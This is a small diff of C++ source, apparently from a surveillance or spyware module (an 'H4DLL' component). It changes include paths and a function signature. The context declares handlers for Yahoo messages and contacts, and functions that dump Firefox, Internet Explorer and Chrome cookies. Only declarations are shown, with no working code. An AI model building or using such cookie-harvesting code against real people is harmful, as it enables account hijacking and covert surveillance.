@@ -8,11 +8,11 @@
 #include <stdio.h>
 #include <string>
 #include <time.h>
-#include "..\common.h"
-#include "../bss.h"
-#include "..\LOG.h"
+#include "../../H4DLL/common.h"
+#include "../../H4DLL/bss.h"
+#include "../../H4DLL/LOG.h"
 #include <json/JSON.h>
-#include "..\bin_string.h"
+#include "../../H4DLL/bin_string.h"
 #include "CookieHandler.h"
 #include "SocialMain.h"
 #include "NetworkHandler.h"
@@ -27,7 +27,7 @@ extern DWORD YahooMessageHandler(char *); // Handler per Yahoo
 extern DWORD YahooContactHandler(char *); // Handler per Yahoo
 
 extern int DumpFFCookies(void); // Cookie per Facebook
-extern int DumpIECookies(WCHAR *); // Cookie per IExplorer
+extern int DumpIECookies(const WCHAR *); // Cookie per IExplorer
 extern int DumpCHCookies(void); // Cookie per Chrome
 
 extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp
